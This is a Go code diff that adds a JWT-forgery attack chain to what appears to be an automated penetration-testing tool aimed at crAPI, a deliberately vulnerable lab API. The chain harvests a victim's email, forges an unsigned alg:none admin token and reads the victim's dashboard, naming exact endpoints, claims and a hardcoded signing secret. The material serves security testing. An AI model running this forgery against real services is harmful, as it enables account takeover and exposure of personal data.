@@ -107,6 +107,59 @@ func crapiChains(base string) []pipeline.AttackPath {
 		crapiBOLAVehicleLocation(base),
 		crapiExcessiveDataExposure(base),
 		crapiNoSQLiCoupon(base),
+		crapiJWTForgery(base),
+	}
+}
+
+// crapiJWTForgery — broken authentication: crAPI verifies JWTs insecurely and
+// accepts an unsigned `alg:none` token (and an HS256 token signed with its
+// hardcoded secret "crapi"), so an attacker can forge a token for ANY user and
+// is authenticated as them with no credentials. VERIFIED against live crAPI: a
+// forged alg:none token with sub=<a seeded user> returns that user's full
+// account at /identity/api/v2/user/dashboard (HTTP 200) — account takeover.
+// Chain: register (to read the feed) -> harvest a victim email from the
+// community feed -> forge an alg:none token as the victim -> read the victim's
+// dashboard.
+func crapiJWTForgery(base string) pipeline.AttackPath {
+	steps := crapiAuthSteps(base)
+	steps = append(steps,
+		pipeline.AttackStep{
+			ID:          uuid.New(),
+			Name:        "harvest a victim email from the community feed",
+			TechniqueID: "T1213",
+			Command: "httpreq --url " + base + "/community/api/v2/community/posts/recent " +
+				"--header 'Authorization: Bearer {{jwt}}' --capture victim_email=$.posts.0.author.email",
+			ExpectedOutputPattern: "email",
+		},
+		pipeline.AttackStep{
+			ID:          uuid.New(),
+			Name:        "forge an unsigned (alg:none) token as the victim",
+			TechniqueID: "T1134", // Access Token Manipulation
+			Command: "jwt --action none " +
+				`--claims '{"sub":"{{victim_email}}","role":"admin","iat":1700000000,"exp":1999999999}' --capture forged=$.token`,
+		},
+		pipeline.AttackStep{
+			ID:          uuid.New(),
+			Name:        "account takeover: read the victim's dashboard with the forged token",
+			TechniqueID: "T1078",
+			Command: "httpreq --url " + base + "/identity/api/v2/user/dashboard " +
+				"--header 'Authorization: Bearer {{forged}}'",
+			// A 200 with the forged (unsigned) token is the vulnerability — a
+			// correct verifier would reject it with 401.
+			ExpectedOutputPattern: "HTTP 200",
+		},
+	)
+	return pipeline.AttackPath{
+		ID:   uuid.New(),
+		Name: "crAPI broken authentication: JWT forgery → account takeover",
+		Description: "crAPI accepts insecurely-verified JWTs — an unsigned alg:none token (and an HS256 " +
+			"token signed with the hardcoded secret 'crapi'). An attacker forges a token for any user and is " +
+			"authenticated as them with no password. Chain: register -> read the community feed to harvest a " +
+			"victim's email -> forge an alg:none token as that victim -> read their dashboard (full PII) = account takeover.",
+		ExpectedImpact:              "critical",
+		EstimatedSuccessProbability: 0.9,
+		RequiredPrivileges:          "unauthenticated (forges its own token)",
+		Steps:                       steps,
 	}
 }
 
